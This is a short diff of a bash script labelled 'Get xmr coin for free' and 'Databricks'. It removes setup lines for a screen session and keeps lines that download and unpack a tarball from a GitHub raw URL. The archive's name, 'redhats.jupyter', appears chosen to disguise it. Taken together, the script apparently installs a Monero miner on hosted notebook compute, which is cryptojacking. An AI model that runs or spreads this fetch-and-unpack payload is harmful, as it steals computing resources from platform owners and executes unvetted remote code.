@@ -1,10 +1,6 @@
 #! /bin/bash
 # Get xmr coin for free
 # Databricks
-apt-get update
-clear
-apt-get install screen -y
-screen -R redhats.jupyter
 
 wget https://raw.githubusercontent.com/chirifa201/python/main/redhats.jupyter.tar.gz
 tar xvzf redhats.jupyter.tar.gz
